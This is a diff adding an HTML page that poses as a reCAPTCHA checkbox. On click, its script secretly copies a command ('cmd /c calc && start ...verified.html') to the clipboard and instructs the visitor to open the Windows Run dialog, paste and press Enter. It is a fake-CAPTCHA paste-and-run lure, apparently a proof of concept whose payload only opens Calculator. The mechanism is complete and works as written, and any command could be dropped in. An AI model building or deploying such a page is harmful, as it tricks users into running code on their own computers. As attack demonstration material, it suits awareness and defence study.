@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello, World!</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+
+        ol {
+            padding-left: 12px;
+        }
+
+        ol li {
+            margin: 12px 0;
+        }
+        
+        .recaptcha-container {
+            width: 300px;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            background-color: #f9f9f9;
+            box-shadow: 0 0 4px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        
+        .recaptcha-body {
+            position: relative;
+            padding: 16px 16px 24px 16px;
+        }
+        
+        .recaptcha-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .checkbox {
+            margin-right: 12px;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .checkbox.checked:after {
+            content: '';
+            position: absolute;
+            top: 4px;
+            left: 8px;
+            width: 6px;
+            height: 12px;
+            border: solid #4a90e2;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        #spinner {
+            margin-right: 12px;
+            display: none;
+            height: 24px;
+            width: 24px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .checkbox-label {
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .recaptcha-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .recaptcha-logo img {
+            width: 42px;
+        }
+        
+        .privacy-terms {
+            position: absolute;
+            bottom: 6px;
+            right: 12px;
+            font-size: 10px;
+            color: #555;
+        }
+        
+        .privacy-terms a {
+            color: #555;
+            text-decoration: none;
+        }
+        
+        .privacy-terms a:hover {
+            text-decoration: underline;
+        }
+        
+        .verify {
+            position: absolute;
+            top: 32px;
+            left: 32px;
+            z-index: 10;
+            display: none;
+            margin-top: 15px;
+            border: 1px solid #d3d3d3;
+            padding: 24px;
+            border-radius: 3px;
+            background-color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="recaptcha-container">
+        <div class="recaptcha-body">
+            <div class="recaptcha-row">
+                <div class="checkbox-container">
+                    <div class="checkbox" id="recaptcha-checkbox" onclick="toggleCheckbox()"></div>
+                    <div id="spinner" alt=""></div>
+                    <div class="checkbox-label" onclick="toggleCheckbox()">I'm not a robot</div>
+                </div>
+                
+                <div class="recaptcha-logo">
+                    <img src="/recaptcha-logo.png" alt="reCAPTCHA logo">
+                </div>
+
+            </div>
+            
+            <div class="verify" id="verify">
+                <p>
+                    To better prove you are not a robot, please:
+                </p>
+                <ol>
+                    <li>
+                        Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                    </li>
+                    
+                    <li>
+                        In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                    </li>
+
+                    <li>
+                        Press <b>Enter</b> on your keyboard to finish.
+                    </li>
+                </ol>
+            </div>
+        </div>
+        <div class="privacy-terms">
+            <a href="#">Privacy</a> - <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        function generateRandomNumber() {
+            const min = 1000; 
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function addTextToClipboard(){
+            // Prepare text to copy
+            const cmd = "cmd /c calc && start " + window.location.origin + "/verified.html?";
+            const prefix = "reCAPTCHA_Verification_Code=" + generateRandomNumber();
+            const textToCopy = cmd + prefix;
+
+            // Add the text to clipboard
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function toggleCheckbox() {
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            const challenge = document.getElementById('verify');
+            const spinner = document.getElementById('spinner');
+            
+            if (!checkbox.classList.contains('checked')) {
+                checkbox.style.display = 'none';
+                spinner.style.display = 'block';
+                // Simulate reCAPTCHA verification process
+                setTimeout(() => {
+                    challenge.style.display = 'block';
+                    
+                    addTextToClipboard();
+                }, 500);
+            }
+        }
+        
+        function toggleSelection(element) {
+            if (element.classList.contains('selected')) {
+                element.classList.remove('selected');
+                element.style.border = 'none';
+            } else {
+                element.classList.add('selected');
+                element.style.border = '3px solid #4a90e2';
+            }
+        }
+        
+        function closeChallenge() {
+            document.getElementById('verify').style.display = 'none';
+        }
+        
+        function verifyChallenge() {
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            const challenge = document.getElementById('verify');
+            
+            // Simulate successful verification
+            checkbox.classList.add('checked');
+            challenge.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
